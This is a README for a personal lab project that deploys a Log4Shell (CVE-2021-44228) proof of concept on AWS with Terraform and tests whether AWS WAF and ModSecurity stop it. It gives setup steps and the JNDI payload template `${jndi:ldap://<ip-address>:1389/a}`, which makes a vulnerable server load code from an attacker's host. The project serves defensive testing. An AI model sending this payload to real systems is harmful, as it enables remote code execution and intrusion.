# Readme

## Project Description
This project files demostrate a proof-of-concept of log4j vulnerability (CVE-2021-44228) on AWS using Terraform Infrastructure-as-a-code means.

There are 2 demo in this project:  
1. single-instance contains a vulnerable server, you can use your personal computer to exploit the server, the server should be protected with AWS WAF.
2. double-instance contans 2 services, the vulnerable server can only be access from the reverse proxy server, the reverse proxy should be protected by ModSecurity.

Conclusion:
The 1st demo demostrate a successful exploit using AWS WAF. The 2nd demo was an unsuccessful attempt when ModSecurity is in placed. Removing ModSecurity the exploit will be successful. It may be because ModSecurity is an active project therefore the vulnerable strings has been identified and filtered.


# Credit
This poc was from :
https://github.com/kozmer/log4j-shell-poc  

This medium blog explain how her attempt walkthrough : 
https://chennylmf.medium.com/apache-log4j-shell-poc-exploits-5953c42fa873  

# My testing  

Personally, I tested using Windows + Powershell, cloud machine is Ubuntu 18 LTS. (Exploitation with kali or any linux)
  
# Pre-requisite

1. Installed AWS_CLI  
2. Installed Terraform CLI   
3. Have Access key ready

## RSA KEY

Create via web (Name it 'tf-aws'): https://console.aws.amazon.com/ec2/v2/home?#KeyPairs


## Get Access key
https://us-east-1.console.aws.amazon.com/iamv2/home#/users > Select user > Select section security_credentials

## Set Access key in shell

Powershell:  
`$env:AWS_ACCESS_KEY_ID="<user access key input>"`  
`$env:AWS_SECRET_ACCESS_KEY="<secret key input>"`  
`$env:AWS_DEFAULT_REGION="<region>"`  

  
Linux:  
`export AWS_ACCESS_KEY_ID="<user access key input>"`  
`export AWS_SECRET_ACCESS_KEY="<secret key input>`  
`export AWS_DEFAULT_REGION="<region>"`

# Usage
## Setup EC2 in AWS platform
 `cd single-instance`  
 `terraform init`    
 `terraform apply`   

 After running, an IP / DNS will be listed.

For single-instance, ensure `http:<aws host url>:8080` is accessible  

For double-instance, ensure `http:<aws host url>` is accessible  

\* please note that spining up 'double-instance' takes a lot more time, can use `journalctl -f` after ssh into the system to track progress
  
If you do follow journal, "Reached target Cloud-init target." means its ready state.  
![exploit](./images/ready_state_double-instance-journal.png|width=70) 

## Prepare Remote / Localhost client (attacker):
Set execute permission
`chmod +x ../exploit-script-remote.sh`    

Run script with supplied variable   
`../exploit-script-remote.sh <desktop | cloud>`  
where desktop means your workdir is at Desktop and cloud means your workdir at ~.

Note the payload is displayed end of script similar to `${jndi:ldap://<ip-address>:1389/a}`

## Vulnerable Server:  
Visit `http:<aws host url>:8080`

Copy the payload into the 'username' field then submit forms  

![exploit](./images/attempt-exploit.png|width=70) 


## Remark 
JDK file: have ensure the integrity from baidu source is same hash from Oracle  
SHA256          187EDA2235F812DDB35C352B5F9AA6C5B184D611C2C9D0393AFB8031D8198974

## References
Instance:
https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance


Spot instance:
https://www.tderflinger.com/en/ec2-spot-with-terraform


SSH:
https://jhooq.com/terraform-ssh-into-aws-ec2/
https://docs.aws.amazon.com/cli/latest/userguide/cli-services-ec2-keypairs.html


[ssh key on the fly]
https://stackoverflow.com/questions/49743220/how-do-i-create-an-ssh-key-in-terraform


Waf:
https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/waf_rule
https://medium.com/kudos-engineering/terraforming-amazons-web-application-firewall-e5c22b7d317d
https://www.linode.com/docs/guides/securing-nginx-with-modsecurity/


Templating:
https://spacelift.io/blog/terraform-templates

AWS AZ ID:
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-availability-zones 

# Things learnt

* (lots of time spent) dont use provision as bash script / use template instead (could better see if could downgrade privilege)
* The RSA key generated from web is more reliable than manually generated from aws-cli if using .pem (the compatibility .pem file to SSH client or AWS server) otherwise use normal rsa key without pem.
* managed to use spot instance instead of normal for some cost saving
* Docker exposing port may overwrite firewall rules
* (lots of time spent) Setting up and Troublehouting networking take lots of time - Route, vpc need 1 sec-group and ec2 host need another sec-group - and both sec-group need to point to vpc


# # Time keeping
* Start 06 Jun 11AM UTC+0800 - 07 Jun 4AM (Completed poc+tf+aws -waf) - 17 hours
* Start 07 Jun 1PM UTC+0800 - 08 Jun 5AM (Completed 2nd case where a reverse proxy is used)





